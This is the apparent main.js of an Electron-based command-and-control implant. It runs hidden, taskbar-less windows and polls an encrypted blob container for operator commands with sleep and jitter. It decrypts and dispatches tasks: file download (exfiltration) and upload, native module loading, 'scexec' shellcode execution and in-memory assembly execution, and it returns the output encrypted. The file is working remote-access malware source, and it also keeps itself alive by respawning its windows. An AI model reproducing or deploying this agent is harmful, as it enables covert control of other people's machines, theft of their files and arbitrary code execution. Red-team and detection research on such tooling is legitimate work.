const { app, BrowserWindow, ipcMain } = require('electron');
const { Agent } = require('./agent.js');
const { func_Encrypt, func_Decrypt, func_Base64_Encode, func_Base64_Decode } = require('./crypt.js');
const { func_Command_Handler } = require('./handler.js');
const { func_Split_Quoted_String, numcheck, getrand } = require('./common.js');
const config = require('./config.js');
const metaContainer = config.metaContainer;
let fileop_timer = 0;
let agent;
let isContainersInit = false;
let agentwindow;
let execwindow;
let initbrowserwindow = false;
let fileop = false;
let scexec_op = false;
let dbg = true;
let exitall = false;
let launch = false;
let handover = false;
global.scexecNodePath = "./keytar.node";
global.assemblyNodePath = "./assembly.node";

function func_log(text) {
    const { log } = require('console');
    if (dbg) {
        log(text);
    }
}

async function func_Window_Create() {
    initbrowserwindow = false;
    agentwindow = new BrowserWindow({
        width: 0,
        height: 0,
        show: false,
        skipTaskbar: true,
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false,
            backgroundThrottling: false,
            v8CacheOptions: 'none'
        }
    });
    initbrowserwindow = true;
    agentwindow.loadFile('browser.html');
}

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') {
    }
});

async function func_Window_Exec() {
    execwindow = new BrowserWindow({
        width: 0,
        height: 0,
        show: false,
        skipTaskbar: true,
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false,
            backgroundThrottling: false,
            v8CacheOptions: 'none'
        }
    });
    execwindow.loadFile('assembly.html');
}

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') {
    }
});

async function func_Container_Init() {
    if (isContainersInit == false) {
        await agentwindow.webContents.send('init-container', agent.container.name, JSON.stringify(agent.container.blobs), agent.container.key['key'].toString('hex'), agent.container.key['iv'].toString('hex'));
        await agentwindow.webContents.send('init-mapping-container', metaContainer, agent.agentid, agent.container.name);
        if (launch == false) {
            launch = true;
        }
    }
}

let globalPaths = {
    scExecNodePath: "./keytar.node",
    assemblyNodePath: "./assembly.node"
};

// Handle requests from renderer to get a global value
ipcMain.handle('get-global-path', (event, key) => {
    globalPaths['scexecNodePath'] = global.scexecNodePath;
    globalPaths['assemblyNodePath'] = global.assemblyNodePath;
    return globalPaths[key] || null;
});

// Allow renderer to update a global value
ipcMain.on('set-global-path', (event, key, value) => {
    globalPaths[key] = value;
    if (key === 'scexecNodePath') {
        global.scexecNodePath = globalPaths[key];
    } else if (key === 'assemblyNodePath') {
        global.assemblyNodePath = globalPaths[key];
    }
});

async function func_Input_Read() {
    try {
        func_log(`func_Input_Read() fileop = ${fileop}`);
        fileop_timer += agent.sleepinterval * 1000;
        if (fileop_timer > 180) {
            fileop = false;
        }
        if (isContainersInit == true && initbrowserwindow == true && fileop == false) {
            if (agentwindow && agentwindow.webContents && !agentwindow.webContents.isDestroyed()) {
                await agentwindow.webContents.send('input-read', agent.container.name, agent.container.blobs['in']);
                fileop_timer = 0;
            } else {
                func_log('Render frame was disposed before WebFrameMain could be accessed');
            }
        }
    } catch (error) {
        func_log(`Error in func_Input_Read() main.js ${error} ${error.stack}`);
    }
}

function func_Window_Stat() {
    try {
        if (isContainersInit == true && fileop == false && exitall == false) {
            if (agent.window.checkin && agent.checkin) {
                let elapsed_window_checkin = (Date.now() - agent.window.checkin) / 1000;
                let elapsed_agent_checkin = (Date.now() - agent.checkin) / 1000;
                if (elapsed_window_checkin > 40 || (elapsed_agent_checkin > agent.sleepinterval * 5 || scexec_op == true)) {
                    func_log(`Creating new window with window ID ${agentwindow.id + 1}`);
                    let old_window = agentwindow;
                    agent.window.checkin = Date.now();
                    agent.checkin = Date.now();
                    func_Window_Create();
                    try {
                        if (scexec_op == false) {
                            old_window.close();
                        } else {
                            scexec_op = false;
                        }
                    } catch (err) {}
                }
            }
        }
    } catch (error) {
        func_log(error);
    }
}

app.on('ready', async () => {
    const initWindowStatus = 'ready';
    agent = new Agent();
    await func_Window_Create();
    setInterval(func_Window_Stat, 5000);
    while (true) {
        if (!isContainersInit) {
            await new Promise(resolve => setTimeout(resolve, 3000));
            await func_Container_Init();
        }
        await func_Input_Read();
        func_log(`Agent.thissleep = ${agent.thissleep}`);
        if (900 * 1000 > agent.thissleep && agent.thissleep > 1 * 888) {
            func_log(`Sleeping for ${agent.thissleep}`);
            await new Promise(resolve => setTimeout(resolve, agent.thissleep));
        } else {
            await new Promise(resolve => setTimeout(resolve, 10000));
        }
    }
});

ipcMain.on('checkin', async (event, checkin) => {
    agent.window.checkin = checkin;
});

ipcMain.on('poll-complete', (event, agentcheckin, inblob) => {
    agent.checkin = agentcheckin;
});

ipcMain.on('do-command', async (event, command) => {
    try {
        let command_output = "";
        let execwin = false;
        handover = false;
        // Decode and decrypt the command received from the input channel blob
        command = await func_Base64_Decode(command);
        command = await func_Decrypt(command, agent.container.key['key'], agent.container.key['iv']);
        func_log(`Decrypted command : ${command}`);
        // Parse the command arguments into array argv[]
        const argv = await func_Split_Quoted_String(command);
        let sendoutput = true;
        if (argv[0] != "") {
            if (argv[0] === 'sleep') {
                func_log(`[-] do-command sleep | main.js | argv[1] : ${argv[1]} | argv[2] : ${argv[2]}`);
                if (!agent.sleepinterval) {
                    agent.sleepinterval = 5;
                }
                if (agent.sleepinterval) {
                    agent.sleepinterval = await numcheck(Number(argv[1]), 5, 0, max = 900);
                    agent.sleepjitter = await numcheck(Number(argv[2]), 15, 0, max = 300);
                    command_output = `Sleeping for ${agent.sleepinterval}s with ${agent.sleepjitter}% jitter.`;
                    agent.thissleep = await getrand(agent.sleepinterval * 1000, agent.sleepjitter);
                } else {
                    command_output = `[!] Error : agent.sleepinterval doesn't exist.`;
                }
            } else if (argv[0] === 'exit-window') {
                agentwindow.close();
            } else if (argv[0] === 'exit-all') {
                agentwindow.close();
                exitall = true;
            } else if (argv[0] === 'download') {
                func_log(`[-] do-command download | main.js`);
                sendoutput = false;
                let srcpath = argv[1];
                let pushblob = argv[2];
                func_log(`srcpath : ${srcpath} | pushblob : ${pushblob}`);
                fileop = true;
                handover = false;
                agentwindow.webContents.send('do-push-file', agent.container.name, srcpath, pushblob, agent.container.key['key'].toString('hex'), agent.container.key['iv'].toString('hex'));
            } else if (argv[0] === 'upload') {
                func_log(`[-] do-command upload | main.js`);
                sendoutput = false;
                let pullblob = argv[1];
                let dstpath = argv[2];
                func_log(`dstpath : ${dstpath} | pullblob : ${pullblob}`);
                fileop = true;
                handover = false;
                agentwindow.webContents.send('do-pull-file', agent.container.name, pullblob, dstpath, agent.container.key['key'].toString('hex'), agent.container.key['iv'].toString('hex'));
            } else if (argv[0] === 'load' || argv[0] === 'scexec' || argv[0] === 'assembly') {
                sendoutput = false;
                execwin = true;
                await func_Window_Exec();
                await new Promise(resolve => setTimeout(resolve, 5000));
                if (argv[0] === 'load') {
                    let nodepath = argv[1];
                    handover = true;
                    if (execwindow) {
                        execwindow.webContents.send('nodeload', nodepath);
                    }
                } else if (argv[0] === 'scexec') {
                    let encscblob = argv[1];
                    handover = true;
                    if (execwindow) {
                        execwindow.webContents.send('scexec', agent.container.name, encscblob, agent.container.key['key'].toString('hex'), agent.container.key['iv'].toString('hex'));
                    }
                } else if (argv[0] === 'assembly') {
                    let encscblob = argv[1];
                    let args = command.slice(22);
                    handover = false;
                    if (execwindow) {
                        execwindow.webContents.send('assembly', agent.container.name, args, encscblob, agent.container.key['key'].toString('hex'), agent.container.key['iv'].toString('hex'));
                    }
                }
            } else {
                func_log(`[-] Hit do-command func_Command_Handler(${command}, ${JSON.stringify(argv)}) | main.js`);
                command_output = await func_Command_Handler(command, argv);
            }
        } else {
            command_output = `Failed to execute command : ${command}`;
        }
        if (sendoutput == true && execwin == false) {
            func_log(`Command output : ${command_output}`);
            command_output = await func_Encrypt(command_output, agent.container.key['key'], agent.container.key['iv']);
            command_output = await func_Base64_Encode(command_output);
            agentwindow.webContents.send('send-output', agent.container.name, agent.container.blobs['out'], command_output);
        }
    } catch (error) {
        func_log(`${error} ${error.stack}`);
    }
});

ipcMain.on('containers-created', async (event, status) => {
    func_log(`IPC containers-created recieved from browser window with status ${status}`);
    if (status == true) {
        isContainersInit = true;
        agent.window.checkin = Date.now();
        agent.checkin = Date.now();
    } else {
        isContainersInit = false;
        await new Promise(resolve => setTimeout(resolve, 5000));
        await func_Container_Init();
    }
});

ipcMain.on('end-file-op', async (event, ipcname, ipcoutput, key, iv) => {
    try {
        func_log(`Hit IPC main.js end-file-op from ${ipcname}`);
        func_log(ipcoutput);
        key = Buffer.from(key, 'hex');
        iv = Buffer.from(iv, 'hex');
        fileop = false;
        let command_output = await func_Encrypt(ipcoutput, key, iv);
        command_output = await func_Base64_Encode(command_output);
        agentwindow.webContents.send('send-output', agent.container.name, agent.container.blobs['out'], command_output);
        if (handover === false) {
            execwindow.close();
        }
    } catch (error) {
        func_log(`[!] Error in end-file-op IPC main.js ${error} ${error.stack}`);
    }
});
